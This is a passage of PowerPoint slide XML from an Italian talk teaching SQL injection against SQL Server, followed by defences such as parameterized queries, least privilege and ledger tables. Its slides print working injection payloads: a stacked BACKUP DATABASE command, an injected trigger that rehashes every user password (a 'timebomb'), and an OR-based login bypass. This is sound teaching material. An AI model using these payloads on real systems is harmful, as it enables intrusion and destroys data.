            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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'; BACKUP DATABASE [model] TO  DISK = N'/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tmp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/AdventureWorksDW2022.bak' WITH NOFORMAT, INIT,  NAME =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N'hasta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-la-vista-baby', SKIP, NOREWIND, NOUNLOAD,  STATS = 10;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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562621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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24C9EF8A-9556-41D5-AB4B-3535574EA6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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{350EB5A3-D931-1FA3-A0AE-0BC0E14F096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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>Rendere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>inutilizzabile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>l’applicazione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> (timebomb)</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{052C6432-ED89-354B-D6CF-496AACC4C19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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64656B3C-70FE-D695-1CB7-59C5CE6DD46F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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400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Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	AND Title LIKE '%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'; EXEC('CREATE TRIGGER T ON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dbo.VersionInfo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 AFTER INSERT AS UPDATE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> SET Password = HASHBYTES(''SHA2_256'', Password)');--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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928884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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0DCF0E6B-8D63-563B-DC82-D5B8ACDC03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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C50D4FA1-0367-8DEC-38C0-F4BADFC40D4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0150" y="1454970"/>
            <a:ext cx="65637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Una query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innocua</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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implementerò</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>così</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31906B54-350C-2399-C432-2B0EC9A07C8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6500" y="448013"/>
            <a:ext cx="911000" cy="91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FC90AEC-DBB7-DB6F-FEF1-8892A7B32D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9653" y="2421134"/>
            <a:ext cx="6715693" cy="1799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16486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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{842ECFBC-E993-6FFB-BF6C-3A73BE033B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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{585BA0E2-AC16-B48C-AC9B-5DC26A89AD8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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Una query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innocua</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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implementerò</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>così</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{08E6A1AA-B8C4-7F1A-E411-BAE292B067E7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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8AD7780F-67DE-71ED-089F-F2CF4EAC75B0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355850" y="2631175"/>
            <a:ext cx="6887100" cy="1546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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT TOP (1)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	*</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>WHERE Email = 'test@example.com'</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	AND Password = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>' OR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'a1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'a1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:latin typeface="Comic Mono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690601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850BBD45-A471-DD73-E4BE-769F8739B0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0">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74860291-D15F-DA8C-1E61-737506D410E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7952" y="1490741"/>
            <a:ext cx="7848095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/>
              <a:t>Altri accorgimenti: utente dedicato, least privilege</a:t>
            </a:r>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="120" name="Google Shape;120;p30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4330DDB9-4EC3-C315-E7AE-E0A149A4259C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6500" y="448013"/>
            <a:ext cx="911000" cy="91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7F88177-6642-C600-E0E4-F28053B234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6135" y="2063441"/>
            <a:ext cx="6202729" cy="2481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18090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11DAA30C-0B39-C748-D4D4-5684AF42BC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0">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1BDA0967-4F3B-78E3-0408-375C8A6861B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93525" y="1490741"/>
            <a:ext cx="535695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Altri accorgimenti: ledger tables</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="120" name="Google Shape;120;p30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B4325C7B-EC94-C01F-7DB8-1DBC522F9501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6500" y="448013"/>
            <a:ext cx="911000" cy="91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D44FAEA-2793-0A9B-415B-EBB61A6662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7508" y="2063441"/>
            <a:ext cx="3108984" cy="2562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393487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4F88D046-96ED-2B53-2887-BD66C18CC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0">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D121D8B8-EB67-47D1-E250-A5F41CBEED4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93525" y="1490741"/>
            <a:ext cx="535695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Non solo front-end</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="120" name="Google Shape;120;p30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0BE3B9B-C834-B8BB-90A0-DE3B3FBC5426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6500" y="448013"/>
            <a:ext cx="911000" cy="91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30;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1755B24A-5122-EF7A-F2FC-66195D9795BD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128450" y="4263163"/>
            <a:ext cx="6887100" cy="224056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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://sqlserverupdates.com/news/new-security-updates-to-fix-sql-injection-vulnerabilities/</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono" pitchFamily="1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31E37A7-F646-67C6-41BE-2569672EAD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88207" y="1999776"/>
            <a:ext cx="2567586" cy="2160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252553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3232"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg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6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2894226"/>
            <a:ext cx="8520600" cy="1199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Grazie!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u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/CodicePlastico/BibeCatalogue</a:t>
            </a:r>
            <a:endParaRPr sz="17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0"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2288581" y="1497613"/>
            <a:ext cx="4566836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Bobby Tables (xkcd.com #327)</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="120" name="Google Shape;120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6500" y="448013"/>
            <a:ext cx="911000" cy="91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30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1311750" y="2070313"/>
            <a:ext cx="6520500" cy="1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B7B7B7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Molto più di una textbox</a:t>
            </a:r>
            <a:endParaRPr sz="1100" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B7B7B7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pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2" descr="A cartoon of two people&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74250F4B-E526-08C0-F935-DD5E12CE85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4451" y="2432471"/>
            <a:ext cx="5955097" cy="183481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1252</TotalTime>
  <Words>2507</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>95</Paragraphs>
  <Slides>46</Slides>
  <Notes>46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4" baseType="lpstr">
      <vt:lpstr>Barlow Condensed Light</vt:lpstr>
      <vt:lpstr>Anonymous Pro</vt:lpstr>
      <vt:lpstr>Barlow Condensed</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Barlow Condensed Medium</vt:lpstr>
      <vt:lpstr>Barlow Condensed SemiBold</vt:lpstr>
      <vt:lpstr>Comic Mono</vt:lpstr>
      <vt:lpstr>Simple Light</vt:lpstr>
      <vt:lpstr>SQL Injection crash(ed) course – Try this ONLY at home! Come alcune scelte di comodo in fase di sviluppo possono portare ad effetti... più che indesiderati</vt:lpstr>
      <vt:lpstr>Una query innocua che non farò mai più</vt:lpstr>
      <vt:lpstr>O meglio, una query innocua che non implementerò mai più così</vt:lpstr>
      <vt:lpstr>Una buona password…</vt:lpstr>
      <vt:lpstr>Una buona password…</vt:lpstr>
      <vt:lpstr>SQL Injection #1: WHERE poisoning</vt:lpstr>
      <vt:lpstr>SQL Injection #1: WHERE poisoning</vt:lpstr>
      <vt:lpstr>Recuperare il numero di campi estratti</vt:lpstr>
      <vt:lpstr>SQL Injection #2: UNION ALL</vt:lpstr>
      <vt:lpstr>SQL Injection #2: UNION ALL</vt:lpstr>
      <vt:lpstr>Recuperare la versione del database server*</vt:lpstr>
      <vt:lpstr>Recuperare la versione del database server**</vt:lpstr>
      <vt:lpstr>Recuperare la struttura del database*</vt:lpstr>
      <vt:lpstr>Recuperare la struttura del database**</vt:lpstr>
      <vt:lpstr>Recuperare la struttura del database</vt:lpstr>
      <vt:lpstr>Recuperare il contenuto di una tabella</vt:lpstr>
      <vt:lpstr>SQL Injection #3: query concatenating</vt:lpstr>
      <vt:lpstr>SQL Injection #3: query concatenating</vt:lpstr>
      <vt:lpstr>Inserimento dati</vt:lpstr>
      <vt:lpstr>Inserimento dati</vt:lpstr>
      <vt:lpstr>SQL Injection #4: blind SQL injection</vt:lpstr>
      <vt:lpstr>Recuperare altri database sullo stesso server</vt:lpstr>
      <vt:lpstr>Recuperare la struttura degli altri database</vt:lpstr>
      <vt:lpstr>Recuperare dati dagli altri database</vt:lpstr>
      <vt:lpstr>Recuperare la configurazione del server</vt:lpstr>
      <vt:lpstr>Recuperare la configurazione del server</vt:lpstr>
      <vt:lpstr>Modificare la configurazione del server</vt:lpstr>
      <vt:lpstr>(Windows) Modificare la configurazione del server</vt:lpstr>
      <vt:lpstr>(Windows) Eseguire comandi sul server</vt:lpstr>
      <vt:lpstr>Elencare i file sul server*</vt:lpstr>
      <vt:lpstr>Recuperare il contenuto di un file sul server*</vt:lpstr>
      <vt:lpstr>Elencare i file sul server**</vt:lpstr>
      <vt:lpstr>Recuperare il contenuto di un file sul server**</vt:lpstr>
      <vt:lpstr>Estrarre le credenziali in chiaro da uno script</vt:lpstr>
      <vt:lpstr>Estrarre le credenziali in chiaro da uno script</vt:lpstr>
      <vt:lpstr>Coprire le proprie tracce</vt:lpstr>
      <vt:lpstr>Elencare i backup dei database</vt:lpstr>
      <vt:lpstr>Rendere inutilizzabili i backup</vt:lpstr>
      <vt:lpstr>Rendere inutilizzabile l’applicazione (timebomb)</vt:lpstr>
      <vt:lpstr>Una query innocua che implementerò così</vt:lpstr>
      <vt:lpstr>Una query innocua che implementerò così</vt:lpstr>
      <vt:lpstr>Altri accorgimenti: utente dedicato, least privilege</vt:lpstr>
      <vt:lpstr>Altri accorgimenti: ledger tables</vt:lpstr>
      <vt:lpstr>Non solo front-end</vt:lpstr>
      <vt:lpstr>Grazie!  https://github.com/CodicePlastico/BibeCatalogue</vt:lpstr>
      <vt:lpstr>Bobby Tables (xkcd.com #327)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Alberto Turelli</dc:creator>
  <cp:lastModifiedBy>Alberto Turelli</cp:lastModifiedBy>
  <cp:revision>43</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-10-20T19:57:57Z</dcterms:modified>
</cp:coreProperties>
</file>